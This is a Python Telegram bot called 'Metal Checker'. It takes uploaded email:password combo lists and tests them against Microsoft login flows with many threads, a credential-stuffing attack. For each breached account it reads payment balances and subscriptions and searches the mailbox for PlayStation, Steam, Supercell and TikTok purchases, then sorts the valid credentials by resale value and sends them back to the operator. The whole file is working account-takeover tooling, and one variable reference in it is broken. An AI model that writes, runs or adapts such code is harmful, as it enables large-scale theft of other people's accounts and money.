# -*- coding: utf-8 -*-
"""
Metal Checker — Automated Account Verification Infrastructure
Developer: @vantrexXxx
Powered by: Metal Drops
"""

import os
import sys
import time
import uuid
import re
import json
import logging
import threading
import shutil
import concurrent.futures
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, unquote
import requests
import telebot
from telebot import types

# Setup Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ══════════════════════════════════════════════════════════════════════
#  ENVIRONMENT CONFIGURATION & INITIALIZATION
# ══════════════════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

if not BOT_TOKEN:
    print("[-] Error: BOT_TOKEN environment variable must be set!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# Thread safe state control
active_scans = {}
state_lock = threading.Lock()
file_lock = threading.Lock()

# ══════════════════════════════════════════════════════════════════════
#  CORE UNIFIED CHECKER ENGINE
# ══════════════════════════════════════════════════════════════════════
class UnifiedChecker:
    def __init__(self, keywords=None, debug=False, api_mode=1, check_mode="both"):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        self.keywords = keywords if keywords else []
        self.api_mode = api_mode
        self.check_mode = check_mode
        
    def parse_country_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if isinstance(account, dict) and "location" in account and account["location"]:
                            return str(account["location"]).strip()
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        return parts[-1] if parts else ""
                for key in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except: pass
        return ""
    
    def parse_name_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "displayName" in json_data and json_data["displayName"]:
                    return str(json_data["displayName"])
                for key in ['name', 'givenName', 'fullName']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except: pass
        return ""
    
    def extract_inbox_count(self, text):
        try:
            patterns = [r'"DisplayName":"Inbox","TotalCount":(\d+)', r'"TotalCount":(\d+)', r'Inbox","TotalCount":(\d+)']
            for pattern in patterns:
                match = re.search(pattern, text)
                if match: return match.group(1)
        except: pass
        return "0"
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str: return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            return str((renewal_date - today).days)
        except: return "0"
    
    def check_microsoft_subscriptions(self, email, password, access_token, cid):
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(state_json)}&prompt=none"
            
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Referer": "https://account.microsoft.com/"
            }
            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=False, timeout=6)
            payment_token = None
            search_text = r.text + " " + r.url
            
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token:
                return {"status": "FREE", "subscriptions": []}
            
            sub_data = {}
            subscriptions = []
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": str(uuid.uuid4()),
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }
            
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r_pay = self.session.get(payment_url, headers=payment_headers, timeout=5)
                if r_pay.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
                    if balance_match: sub_data['balance'] = "$" + balance_match.group(1)
            except: pass
            
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r_sub = self.session.get(trans_url, headers=payment_headers, timeout=5)
                if r_sub.status_code == 200:
                    response_text = r_sub.text
                    subscription_keywords = {
                        'Xbox Game Pass Ultimate': {'type': 'GAME PASS ULTIMATE', 'category': 'gaming'},
                        'PC Game Pass': {'type': 'PC GAME PASS', 'category': 'gaming'},
                        'Xbox Game Pass': {'type': 'GAME PASS', 'category': 'gaming'},
                        'Xbox Live Gold': {'type': 'XBOX LIVE GOLD', 'category': 'gaming'},
                        'Microsoft 365 Family': {'type': 'M365 FAMILY', 'category': 'office'},
                        'Microsoft 365 Personal': {'type': 'M365 PERSONAL', 'category': 'office'}
                    }
                    for keyword, info in subscription_keywords.items():
                        if keyword in response_text:
                            sub_info = {'name': info['type'], 'category': info['category']}
                            renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                            if renewal_match:
                                sub_info['renewal_date'] = renewal_match.group(1)
                                days_remaining = self.get_remaining_days(date_str=renewal_match.group(1) + "T00:00:00Z")
                                sub_info['days_remaining'] = days_remaining
                                if int(days_remaining) < 0: sub_info['is_expired'] = True
                            subscriptions.append(sub_info)
            except: pass
            
            active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
            return {"status": "PREMIUM" if active_subs else "FREE", "subscriptions": subscriptions, "data": sub_data}
        except:
            return {"status": "FREE", "subscriptions": [], "data": {}}

    def check_psn(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation", "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0, "Query": {"QueryString": "sony@txn-email.playstation.com OR PlayStation Order Number"}, "Size": 15
                }]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
            if r.status_code == 200:
                data = r.json()
                total_orders = data.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                if total_orders > 0: return {"psn_status": "HAS_ORDERS", "psn_orders": total_orders}
            return {"psn_status": "FREE", "psn_orders": 0}
        except: return {"psn_status": "FREE", "psn_orders": 0}

    def check_steam(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@steampowered.com purchase"}, "Size": 10}]
            }
            headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
            if r.status_code == 200:
                total = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                if total > 0: return {"steam_status": "HAS_PURCHASES", "steam_count": total}
            return {"steam_status": "FREE", "steam_count": 0}
        except: return {"steam_status": "FREE", "steam_count": 0}

    def check_supercell(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@id.supercell.com"}, "Size": 10}]
            }
            headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
            if r.status_code == 200:
                total = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                if total > 0: return {"supercell_status": "LINKED"}
            return {"supercell_status": "FREE"}
        except: return {"supercell_status": "FREE"}

    def check_tiktok(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "account.tiktok"}, "Size": 5}]
            }
            headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
            if r.status_code == 200:
                total = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                if total > 0: return {"tiktok_status": "LINKED"}
            return {"tiktok_status": "FREE"}
        except: return {"tiktok_status": "FREE"}

    def check_minecraft(self, email, access_token, cid):
        try:
            r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, timeout=5)
            if r.status_code == 200:
                return {"minecraft_status": "OWNED", "minecraft_username": r.json().get('name', 'Unknown')}
            return {"minecraft_status": "FREE"}
        except: return {"minecraft_status": "FREE"}

    def check_inbox_folders(self, email, access_token, cid):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                "EntityRequests": [{"EntityType": "Folder", "ContentSources": ["Exchange"], "Size": 20}]
            }
            headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(url, json=payload, headers=headers, timeout=5)
            if r.status_code == 200:
                return self.extract_inbox_count(r.text)
            return "0"
        except: return "0"

    def check(self, email, password):
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite", "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)"
            }
            r1 = self.session.get(url1, headers=headers1, timeout=6)
            if "MSAccount" not in r1.text or any(k in r1.text for k in ["Neither", "Both", "OrgId"]):
                return {"status": "BAD"}
            
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = self.session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=6)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match: return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            login_data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft_match.group(1)}&type=11&LoginOptions=1"
            r3 = self.session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, allow_redirects=False, timeout=6)
            
            if "incorrect" in r3.text.lower() or "error" in r3.text.lower(): return {"status": "BAD"}
            if "identity/confirm" in r3.text.lower() or "consent" in r3.text.lower(): return {"status": "2FA"}
            
            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match: return {"status": "BAD"}
            
            mspcid = self.session.cookies.get("MSPCID", "").upper()
            token_data = f"client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&grant_type=authorization_code&code={code_match.group(1)}&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=6)
            if "access_token" not in r4.text: return {"status": "BAD"}
            
            access_token = r4.json()["access_token"]
            
            inbox_count = "0"
            if self.check_mode == "inbox":
                inbox_count = self.check_inbox_folders(email, access_token, mspcid)
                ms_res = {"status": "FREE", "subscriptions": []}
                psn_res = {"psn_status": "FREE", "psn_orders": 0}
                steam_res = {"steam_status": "FREE", "steam_count": 0}
                sc_res = {"supercell_status": "FREE"}
                tt_res = {"tiktok_status": "FREE"}
                mc_res = {"minecraft_status": "FREE"}
            else:
                ms_res = self.check_microsoft_subscriptions(email, password, access_token, mspcid)
                psn_res = self.check_psn(email, access_token, mspcid)
                steam_res = self.check_steam(email, access_token, mspcid)
                sc_res = self.check_supercell(email, access_token, mspcid)
                tt_res = self.check_tiktok(email, access_token, mspcid)
                mc_res = self.check_minecraft(email, access_token, mspcid)
            
            return {
                "status": "HIT", "email": email, "password": password, "inbox_count": inbox_count,
                "ms_status": ms_res.get("status", "FREE"), "subscriptions": ms_res.get("subscriptions", []),
                "psn_status": ps_res.get("psn_status", "FREE"), "psn_orders": ps_res.get("psn_orders", 0),
                "steam_status": steam_res.get("steam_status", "FREE"), "steam_count": steam_res.get("steam_count", 0),
                "supercell_status": sc_res.get("supercell_status", "FREE"),
                "tiktok_status": tt_res.get("tiktok_status", "FREE"),
                "minecraft_status": mc_res.get("minecraft_status", "FREE")
            }
        except: return {"status": "BAD"}

# ══════════════════════════════════════════════════════════════════════
#  TELEGRAM DYNAMIC FOLDER RESULT MANAGER
# ══════════════════════════════════════════════════════════════════════
class DynamicResultManager:
    def __init__(self, task_id, check_mode="both"):
        self.check_mode = check_mode
        self.base_folder = f"results/task_{task_id}_{datetime.now().strftime('%H%M%S')}"
        
        if self.check_mode == "inbox":
            self.inbox_hits = os.path.join(self.base_folder, "inbox_hits")
            Path(self.inbox_hits).mkdir(parents=True, exist_ok=True)
        else:
            self.xbox_folder = os.path.join(self.base_folder, "xbox_hits")
            self.psn_folder = os.path.join(self.base_folder, "psn_hits")
            self.steam_folder = os.path.join(self.base_folder, "steam_hits")
            self.other_hits = os.path.join(self.base_folder, "other_hits")
            
            Path(self.xbox_folder).mkdir(parents=True, exist_ok=True)
            Path(self.psn_folder).mkdir(parents=True, exist_ok=True)
            Path(self.steam_folder).mkdir(parents=True, exist_ok=True)
            Path(self.other_hits).mkdir(parents=True, exist_ok=True)
        
        self.all_hits_file = os.path.join(self.base_folder, "all_hits.txt")
        self.two_fa_file = os.path.join(self.base_folder, "2fa.txt")

    def save_result(self, res):
        with file_lock:
            if self.check_mode == "inbox":
                line = f"{res['email']}:{res['password']} | Inbox Mails: {res['inbox_count']}\n"
                with open(self.all_hits_file, "a", encoding="utf-8") as f: f.write(line)
                with open(os.path.join(self.inbox_hits, "inbox_actives.txt"), "a", encoding="utf-8") as f: f.write(line)
            else:
                line = f"{res['email']}:{res['password']}\n"
                with open(self.all_hits_file, "a", encoding="utf-8") as f: f.write(line)
                
                if res.get("ms_status") == "PREMIUM" or len(res.get("subscriptions", [])) > 0:
                    with open(os.path.join(self.xbox_folder, "xbox_premium.txt"), "a", encoding="utf-8") as f:
                        f.write(f"{res['email']}:{res['password']} | Subs: {json.dumps(res['subscriptions'])}\n")
                elif res.get("psn_status") == "HAS_ORDERS":
                    with open(os.path.join(self.psn_folder, "psn_has_orders.txt"), "a", encoding="utf-8") as f:
                        f.write(f"{res['email']}:{res['password']} | Orders: {res['psn_orders']}\n")
                elif res.get("steam_status") == "HAS_PURCHASES":
                    with open(os.path.join(self.steam_folder, "steam_has_purchases.txt"), "a", encoding="utf-8") as f:
                        f.write(f"{res['email']}:{res['password']} | Count: {res['steam_count']}\n")
                else:
                    with open(os.path.join(self.other_hits, "hits.txt"), "a", encoding="utf-8") as f: f.write(line)

    def save_2fa(self, email, password):
        with file_lock:
            with open(self.two_fa_file, "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")

# ══════════════════════════════════════════════════════════════════════
#  TELEGRAM BOT CONTROLLERS & UI
# ══════════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "⚡ *Welcome to Metal Checker Infrastructure* ⚡\n\n"
        "▫️ *Developer:* `@vantrexXxx`\n"
        "▫️ *Powered by:* `Metal Drops`\n\n"
        "Please choose a checking engine module from below component matrix to begin structure pipeline:"
    )
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_xbox = types.InlineKeyboardButton("🎮 Xbox Checker (All-in-One)", callback_data="set_mode_both")
    btn_inbox = types.InlineKeyboardButton("📥 Inbox Checker", callback_data="set_mode_inbox")
    markup.add(btn_xbox, btn_inbox)
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data in ["set_mode_both", "set_mode_inbox"])
def ask_threads_count(call):
    with state_lock:
        if call.from_user.id in active_scans:
            bot.answer_callback_query(call.id, "⚠️ You have an active running session!")
            return
            
    mode = "both" if call.data == "set_mode_both" else "inbox"
    msg = bot.send_message(call.message.chat.id, "🔢 How many threads would you like to run? (Enter a number between 1 and 100):")
    bot.register_next_step_handler(msg, process_thread_input, mode)
    bot.answer_callback_query(call.id)

def process_thread_input(message, mode):
    try:
        threads = int(message.text.strip())
        if not (1 <= threads <= 100): raise ValueError()
    except:
        msg = bot.send_message(message.chat.id, "❌ Invalid thread number. Enter a valid integer between 1 and 100:")
        bot.register_next_step_handler(msg, process_thread_input, mode)
        return

    msg = bot.send_message(message.chat.id, "📝 Please upload a .txt file or paste your account list details (`email:password` format):")
    bot.register_next_step_handler(msg, process_combo_input, mode, threads)

def process_combo_input(message, mode, threads):
    combo_text = ""
    if message.document:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        combo_text = downloaded_file.decode("utf-8", errors="ignore")
    elif message.text:
        combo_text = message.text
    else:
        bot.send_message(message.chat.id, "❌ Invalid input. Please use `/start` to reset.")
        return

    lines = combo_text.strip().split("\n")
    accounts = []
    for line in lines:
        parts = line.strip().split(":")
        if len(parts) >= 2:
            accounts.append((parts[0].strip(), parts[1].strip()))

    if not accounts:
        bot.send_message(message.chat.id, "❌ Zero valid accounts found in list. Process closed.")
        return

    status_msg = bot.send_message(
        message.chat.id, 
        "⏳ *Metal Checker Framework Initializing Dynamic Threads...*\n"
        "Please wait while pipeline loads tracking data.",
        parse_mode="Markdown"
    )

    task_id = str(uuid.uuid4())[:8]
    rm = DynamicResultManager(task_id, check_mode=mode)
    
    scan_state = {
        "total": len(accounts),
        "checked": 0,
        "hits": 0,
        "xbox_hits": 0,
        "psn_hits": 0,
        "steam_hits": 0,
        "bads": 0,
        "twofa": 0,
        "status_msg_id": status_msg.message_id,
        "chat_id": message.chat.id,
        "rm": rm,
        "start_time": time.time(),
        "last_update_time": 0, 
        "is_running": True,
        "check_mode": mode,
        "threads": threads
    }


    with state_lock:
        active_scans[message.from_user.id] = scan_state

    threading.Thread(target=run_checker_pool, args=(message.from_user.id, accounts), daemon=True).start()

def run_checker_pool(user_id, accounts):
    with state_lock:
        state = active_scans.get(user_id)
    if not state: return

    max_workers = state["threads"]
    
    def process_single(acc):
        with state_lock:
            if not state["is_running"]: return False
            
        email, password = acc
        checker = UnifiedChecker(check_mode=state["check_mode"])
        
        try:
            res = checker.check(email, password)
        except Exception as e:
            res = {"status": "BAD"}

        with state_lock:
            state["checked"] += 1
            
            if res.get("status") == "HIT":
                state["hits"] += 1
                if state["check_mode"] == "both":
                    if res.get("ms_status") == "PREMIUM" or len(res.get("subscriptions", [])) > 0:
                        state["xbox_hits"] += 1
                    if res.get("psn_status") == "HAS_ORDERS":
                        state["psn_hits"] += 1
                    if res.get("steam_status") == "HAS_PURCHASES":
                        state["steam_hits"] += 1
                try: state["rm"].save_result(res)
                except: pass
            elif res.get("status") == "2FA":
                state["twofa"] += 1
                try: state["rm"].save_2fa(email, password)
                except: pass
            else:
                state["bads"] += 1

            # Her hesap kontrolü bittiğinde güvenli tetikleyiciyi çağır
            update_live_results(user_id)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(process_single, accounts)

    finalize_scan_session(user_id)

def update_live_results(user_id):
    with state_lock:
        state = active_scans.get(user_id)
    if not state: return

    current_time = time.time()
    
    # 1. İlk hesap kontrol edildiğinde ANINDA tetiklenir (böylece o "yükleniyor" yazısı hemen gider)
    # 2. Sonraki kontrollerde Telegram API'yi yormamak için EN AZ 5 SANİYE geçmesini bekler.
    # 3. Liste tamamen bittiğinde son durumu ekrana basmak için süreyi bypass eder.
    if state["checked"] > 1 and (current_time - state["last_update_time"] < 5.0) and state["checked"] != state["total"]:
        return

    # Son güncelleme zamanını kaydet
    with state_lock:
        state["last_update_time"] = current_time

    elapsed = current_time - state["start_time"]
    cpm = (state["checked"] / elapsed) * 60 if elapsed > 0 else 0
    
    if state["check_mode"] == "inbox":
        live_text = (
            "📊 *Metal Checker Infrastructure - Live Statistics (Inbox Mode)*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📥 *Total Active Hits:* `{state['hits']}`\n"
            f"🔑 *2FA Accounts:* `{state['twofa']}`\n"
            f"❌ *Bad Accounts:* `{state['bads']}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📈 *Progress Check:* `{state['checked']}` / `{state['total']}`\n"
            f"🧵 *Threads Config:* `{state['threads']}`\n"
            f"⚡ *Speed Rate:* `{cpm:.0f} CPM`\n"
            f"⏱️ *Elapsed Time:* `{int(elapsed)}s`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🟢 _Processing framework threads dynamically..._"
        )
    else:
        live_text = (
            "📊 *Metal Checker Infrastructure - Live Statistics (All-in-One)*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 *Xbox / Premium Hits:* `{state['xbox_hits']}`\n"
            f"🔵 *PSN Hits:* `{state['psn_hits']}`\n"
            f"💨 *Steam Hits:* `{state['steam_hits']}`\n"
            f"✅ *Total Hits:* `{state['hits']}`\n"
            f"🔑 *2FA Accounts:* `{state['twofa']}`\n"
            f"❌ *Bad Accounts:* `{state['bads']}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📈 *Progress Check:* `{state['checked']}` / `{state['total']}`\n"
            f"🧵 *Threads Config:* `{state['threads']}`\n"
            f"⚡ *Speed Rate:* `{cpm:.0f} CPM`\n"
            f"⏱️ *Elapsed Time:* `{int(elapsed)}s`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🟢 _Processing framework threads dynamically..._"
        )
    
    try:
        # Doğrudan tek bir kanaldan edit atar, thread patlaması yaşatmaz
        bot.edit_message_text(live_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
    except Exception:
        # Olası bir anlık Telegram block durumunda botun ve havuzun kilitlenmesini engeller
        pass

def finalize_scan_session(user_id):
    with state_lock:
        state = active_scans.get(user_id)
    if not state: return

    elapsed = time.time() - state["start_time"]
    
    if state["check_mode"] == "inbox":
        final_text = (
            "🏁 *Structure Verification Sequence Complete (Inbox)* 🏁\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📥 *Total Active Hits:* `{state['hits']}`\n"
            f"🔑 *2FA Records:* `{state['twofa']}`\n"
            f"❌ *Bad Accounts:* `{state['bads']}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏱️ *Total Duration:* `{int(elapsed)} seconds`\n"
            "📦 _Compiling architectural data storage. Sending shortly below..._"
        )
    else:
        final_text = (
            "🏁 *Structure Verification Sequence Complete (All-in-One)* 🏁\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 *Xbox Premium Hits:* `{state['xbox_hits']}`\n"
            f"🔵 *PSN Hits:* `{state['psn_hits']}`\n"
            f"💨 *Steam Hits:* `{state['steam_hits']}`\n"
            f"✅ *All Checked Hits:* `{state['hits']}`\n"
            f"🔑 *2FA Records:* `{state['twofa']}`\n"
            f"❌ *Bad Accounts:* `{state['bads']}`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏱️ *Total Duration:* `{int(elapsed)} seconds`\n"
            "📦 _Compiling architectural data storage. Sending shortly below..._"
        )
    
    try: bot.edit_message_text(final_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
    except: pass

    folder_path = state["rm"].base_folder
    zip_output_filename = f"{folder_path}"
    
    if os.path.exists(folder_path):
        shutil.make_archive(zip_output_filename, 'zip', folder_path)
        zip_file_full_path = f"{zip_output_filename}.zip"
        
        if os.path.exists(zip_file_full_path):
            with open(zip_file_full_path, 'rb') as doc:
                bot.send_document(
                    state["chat_id"], 
                    doc, 
                    caption="✅ *Verification results structured successfully inside directory archive!*",
                    parse_mode="Markdown"
                )
            try:
                os.remove(zip_file_full_path)
                shutil.rmtree(folder_path)
            except: pass
    
    with state_lock:
        if user_id in active_scans:
            del active_scans[user_id]

@bot.message_handler(func=lambda m: True)
def default_catchall(message):
    send_welcome(message)

if __name__ == "__main__":
    print("=====================================================")
    print("  Metal Checker Security Bot Initializing...         ")
    print("  Developer: @vantrexXxx                             ")
    print("  Powered by: Metal Drops                            ")
    print("=====================================================")
    
    try:
        bot.delete_webhook(drop_pending_updates=True)
        time.sleep(1) 
    except Exception as error_msg:
        print(f"[!] Webhook cleanup warning: {error_msg}")

    bot.infinity_polling()

